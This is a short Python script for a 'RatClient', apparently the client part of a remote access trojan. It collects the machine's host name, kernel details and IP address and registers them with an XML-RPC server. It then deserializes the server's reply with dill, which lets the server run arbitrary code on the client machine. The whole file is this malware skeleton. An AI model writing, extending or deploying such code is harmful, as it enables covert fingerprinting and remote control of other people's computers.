#!/usr/local/bin/python3

from xmlrpc import client
import os
import socket
import dill

server_ip = socket.gethostbyname(socket.gethostname())
server_port = 4001


def convert_to(obj):
    return client.Binary(dill.dumps(obj))

def convert_from(obj):
    return dill.loads(obj.data)

class RatClient():

    def __init__(self):
        self.rat_client = client.ServerProxy("http://{0}:{1}"
                                             .format(server_ip, server_port))

    def get_system_information(self):
        host_name = socket.gethostname()
        kernel_info = os.uname()
        ip_address = socket.gethostbyname(host_name)
        result = [host_name, kernel_info, ip_address]
        return result


if __name__ == '__main__':
    rat = RatClient()
    rat.rat_client.register_client(convert_to(rat.get_system_information()))
    result = convert_from(rat.rat_client.create_client_server())
